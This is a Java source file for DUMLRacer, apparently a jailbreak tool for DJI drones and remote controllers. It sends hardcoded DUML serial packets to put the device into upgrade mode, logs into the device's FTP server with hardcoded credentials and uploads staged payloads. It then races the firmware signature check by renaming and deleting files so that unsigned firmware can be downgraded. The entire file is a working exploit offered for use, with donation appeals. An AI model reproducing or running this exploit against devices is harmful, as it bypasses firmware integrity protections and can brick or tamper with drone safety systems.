package com.cunninglogic.dumlracer;

import com.fazecast.jSerialComm.SerialPort;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import java.io.*;

public class Main {

    private static SerialPort activePort = null;

    private static ClassLoader classLoader;

    private static FTPClient ftpClient;

    //ToDo select RC/Google/AC

    private static byte[] upgradeModePKT;
    private static byte[] fileSizePKT;
    private static  byte[] hashPKT;
    private static byte[] fileSizePKT2;
    private static  byte[] hashPKT2;


    public static void main(String[] args) throws IOException {
        System.out.println("DUMLRacer 1.0");
	    System.out.println("Copyright 2017/2018 APIs Research LLC");
        System.out.println("jcase in the house!\n");

        System.out.println("This software comes with NO WARRANTY AT ALL. If it bricks your equipment, your fault not anyone else's. " +
                "You agree to take full responsibility of any harm, damage, injury or loss of life from using your equipment improperly. "+
                "Do not use this software to illegally modify your equipment. Do not redistribute this software. Do not use it in any " +
                "commercial venture without first getting written permission from APIs Research LLC.\n");


        if (args.length != 1 || (!args[0].equals("AC") && !args[0].equals("RC"))) {
            printHelp();
            return;
        }

        if (args[0].equals("AC")) {
            upgradeModePKT = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x28, 0x65, 0x57, 0x40, 0x00, 0x07, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x27, (byte)0xD3};
            fileSizePKT = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x28, 0x6B, 0x57, 0x40, 0x00, 0x08, 0x00, 0x6F,
                    (byte)0xE4, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x20, 0x7F};
            hashPKT = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x28, (byte)0xF6, 0x57, 0x40, 0x00, 0x0A, 0x00,
                    (byte)0xB0, (byte)0x95, (byte)0xDD, 0x44, 0x26, 0x20, 0x1C, (byte)0xB0, 0x58, 0x4A, (byte)0x9A, 0x13,
                    0x75, 0x3F, (byte)0x92, (byte)0x9D, 0x4F, (byte)0xBB};
            fileSizePKT2 = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x28, 0x6B, 0x57, 0x40, 0x00, 0x08, 0x00,
                    (byte)0xB7, (byte)0xC7, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x11, 0x35};
            hashPKT2 = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x28, (byte)0xF6, 0x57, 0x40, 0x00, 0x0A, 0x00,
                    0x30, 0x4C, (byte)0xC3, 0x64, 0x71, (byte)0xE3, 0x04, 0x23, 0x35, 0x18, 0x42, (byte)0xA8, 0x23,
                    (byte)0xB6, (byte)0xA0, 0x41, 0x3C, (byte)0xF3};

        } else if (args[0].equals("RC")) {
            upgradeModePKT = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x2D, (byte)0xE7, 0x27, 0x40, 0x00, 0x07,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte)0x9F, 0x44};
            fileSizePKT = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x2D, (byte)0xEC, 0x27, 0x40, 0x00, 0x08,
                    0x00, 0x6F, (byte)0xE4, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x50, (byte)0xFD};
            hashPKT = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x2D, 0x02, 0x28, 0x40, 0x00, 0x0A, 0x00, (byte)0xB0,
                    (byte)0x95, (byte)0xDD, 0x44, 0x26, 0x20, 0x1C, (byte)0xB0, 0x58, 0x4A, (byte)0x9A, 0x13, 0x75, 0x3F,
                    (byte)0x92, (byte)0x9D, (byte)0x99, (byte)0xD6};
            fileSizePKT2 = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x2D, (byte)0xEC, 0x27, 0x40, 0x00, 0x08,
                    0x00, (byte)0xB7, (byte)0xC7, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04, 0x61, (byte)0xB7};
            hashPKT2 = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x2D, 0x02, 0x28, 0x40, 0x00, 0x0A, 0x00, 0x30,
                    0x4C, (byte)0xC3, 0x64, 0x71, (byte)0xE3, 0x04, 0x23, 0x35, 0x18, 0x42, (byte)0xA8, 0x23, (byte)0xB6,
                    (byte)0xA0, 0x41, (byte)0xEA, (byte)0x9E};
        } else {
            System.out.println("wth?");
            return;
        }

        System.out.println("I either need to recoup the cost of my Mavic, or sell it. If I can recoup it, I can keep hacking");
        System.out.println("PayPal Donations - > jcase@cunninglogic.com");
        System.out.println("Bitcoin Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN");
        System.out.println("Bitcoin Cash Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN");
        System.out.println("Amazon giftcards, plain thank yous or anything else -> jcase@cunninglogic.com");
        System.out.println("Any donations in excess of the drone cost, will go to Special Olympics!\n");

        classLoader = Main.class.getClassLoader();


        int count = 1;

        System.out.println("Choose target port: (* suggested port)");
        for (SerialPort s : SerialPort.getCommPorts()) {
            if (s.getDescriptivePortName().contains("DJI")) {
                System.out.print("*");
            }

            System.out.println("\t[" + count + "] " + s.getSystemPortName() + " : " + s.getDescriptivePortName());
            count++;
        }

        System.out.println("\t[E] Exit");

        String str;
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Choose port: ");
        while (true) {
            str = br.readLine();
            try {

                if (str.toLowerCase().toLowerCase().equals("e")) {
                    System.out.println("Exiting");
                    System.exit(0);
                }


                int port = Integer.parseInt(str.trim());

                if ((port > count) || (port < 1)) {
                    System.out.println("[!] Invalid port selection");
                    System.out.print("Choose port: ");
                } else {
                    activePort = SerialPort.getCommPorts()[port - 1];
                    System.out.println("Using Port: " + activePort.getSystemPortName());
                    break;
                }
            } catch (NumberFormatException e) {
                System.out.println("[!] Invalid port selection");
                System.out.print("Choose port: ");
            }
        }

        if (activePort == null) {
            System.out.println("Couldn't find port, exiting");
            return;
        }


        if (activePort.isOpen()) {
            System.out.println(activePort.getSystemPortName() + " is already open");
            activePort.closePort(); //meh why not
            return;
        }

        if (!activePort.openPort()) {
            System.out.println("Couldn't open port, exiting");
            activePort.closePort(); //meh why not
            return;
        }

        activePort.setBaudRate(115200);

        System.out.println();


        //Enter upgrade mode (delete old file if exists)
        activePort.writeBytes(upgradeModePKT,upgradeModePKT.length);


        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        try {
            ftpClient = new FTPClient();
            ftpClient.connect("192.168.42.2", 21);
            ftpClient.login("jcase","password");
            ftpClient.enterLocalPassiveMode();

            System.out.println("Uploading first payload");
            upload("resources/stage1.bin");
        } catch (Exception e) {
            System.out.println("Couldn't talk to ftpD");
            activePort.closePort();
            e.printStackTrace();
            return;
        }

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


        activePort.writeBytes(fileSizePKT,fileSizePKT.length);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }


        activePort.writeBytes(hashPKT,hashPKT.length);

        System.out.println("Starting the first race!");
        race1();
        FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/");
        boolean winner = false;
        for (FTPFile f : files) {
            if (f.toString().contains("freedom")) {
                winner = true;
                break;
            }
        }

        if (winner) {
            System.out.println("You got first place! DJI Lost that race!");
        } else {
            System.out.println("You lost the race! :(");
            ftpClient.disconnect();
            activePort.closePort();
            return;
        }

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        activePort.writeBytes(upgradeModePKT,upgradeModePKT.length);
      //  activePort.writeBytes(enableReportingPKT,enableReportingPKT.length);

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        try {
            System.out.println("Uploading second payload");

            upload("resources/stage2.bin");
        } catch (Exception e) {
            System.out.println("Couldn't talk to ftpD");
            activePort.closePort();
            e.printStackTrace();
            return;
        }
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }




        activePort.writeBytes(fileSizePKT2,fileSizePKT2.length);

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }



        activePort.writeBytes(hashPKT2,hashPKT2.length);



        System.out.println("Starting the second race!");
        race2();

        winner = false;


        int timeout = 0;
        while (!winner) {
            files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
            if (files.length == 0) {
                break;
            }
            System.out.print(".");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            timeout +=1;

            if (timeout > 300) {
                System.out.println("Something went wrong, I guess you can try downgrading and see?");
                activePort.closePort();
                ftpClient.disconnect();
                return;
            }
        }

        System.out.println("Looks like we won the race, try downgrading!");

        activePort.closePort();
        ftpClient.disconnect();


    }

    private static void printHelp() {
        System.out.println("java -jar DUMLRacer.jar <mode>");
        System.out.println("Modes:");
        System.out.println("AC - target AC");
        System.out.println("RC - target RC");
    }

    private static void race1() throws IOException {
        boolean flag = false;
        while (!flag) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");

            for (FTPFile f : files) {
                if (f.toString().contains("flag")) {
                    flag = true;
                    break;
                }
            }
        }

        ftpClient.rename("/upgrade/upgrade/signimgs/freedom","/upgrade/upgrade/freedom");
        ftpClient.rename("/upgrade/upgrade/signimgs/jcase","/upgrade/upgrade/jcase");
    }

    private static void race2() throws IOException {
        boolean flag = false;
        while (!flag) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");

            for (FTPFile f : files) {
                if (f.toString().contains("dummy")) {
                    flag = true;
                    break;
                }
            }
        }



        ftpClient.rename("/upgrade/upgrade/freedom","/upgrade/upgrade/signimgs/freedom");
        ftpClient.rename("/upgrade/upgrade/jcase","/upgrade/upgrade/signimgs/jcase");

        flag = false;
        while (!flag) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");

            for (FTPFile f : files) {
                if (f.toString().contains("wellhello")) {
                    flag = true;
                    break;
                }
            }
        }


        ftpClient.deleteFile("/upgrade/upgrade/signimgs/freedom");
        ftpClient.deleteFile("/upgrade/upgrade/signimgs/jcase");
    }

    private static void upload(String fileName) throws Exception {
        InputStream is = classLoader.getResourceAsStream(fileName);
        ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
        boolean done = ftpClient.storeFile("/upgrade/dji_system.bin", is);
        is.close();
        if (!done) {
            System.out.println("Failed to upload payload.");
            System.exit(-1);
        }
    }

    //start the race
    private static void DJI_stop_violating_the_GPL() {

    }

    final protected static char[] hexArray = "0123456789ABCDEF".toCharArray();

    public static String bytesToHex(byte[] bytes) {
        char[] hexChars = new char[bytes.length * 2];
        for (int j = 0; j < bytes.length; j++) {
            int v = bytes[j] & 0xFF;
            hexChars[j * 2] = hexArray[v >>> 4];
            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
        }
        return new String(hexChars);
    }
}
